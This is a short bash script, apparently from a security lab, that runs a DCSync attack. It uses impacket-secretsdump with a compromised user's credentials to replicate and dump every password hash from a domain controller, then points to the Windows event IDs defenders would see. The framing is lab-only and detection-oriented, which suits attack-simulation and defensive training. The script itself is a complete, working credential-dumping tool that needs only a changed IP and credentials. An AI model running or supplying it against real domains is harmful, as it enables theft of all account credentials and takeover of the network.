#!/usr/bin/env bash
# T1003.006 — DCSync against the lab domain, using jsmith's rights
# (granted via the ACL-abuse step, see README.md). Run from the
# attacker host (Kali), against the lab domain ONLY.
set -euo pipefail

DC_IP="${DC_IP:-192.168.50.10}"
DOMAIN="${DOMAIN:-lab.local}"
COMPROMISED_USER="${COMPROMISED_USER:?set COMPROMISED_USER=jsmith}"
COMPROMISED_PASS="${COMPROMISED_PASS:?set COMPROMISED_PASS=theirpassword}"
OUTFILE="dcsync-dump"

echo "[*] $(date -Is) Requesting directory replication (DCSync) as ${COMPROMISED_USER}..."
impacket-secretsdump "${DOMAIN}/${COMPROMISED_USER}:${COMPROMISED_PASS}@${DC_IP}" \
  -just-dc -outputfile "${OUTFILE}"

echo "[+] $(date -Is) Done. Hashes written to ${OUTFILE}.ntds (and .ntds.cleartext if any)."
echo "    Check Sysmon/Wazuh on dc01 for Event ID 4662 with the DS-Replication-Get-Changes"
echo "    GUIDs around the 'Requesting directory replication' timestamp above."
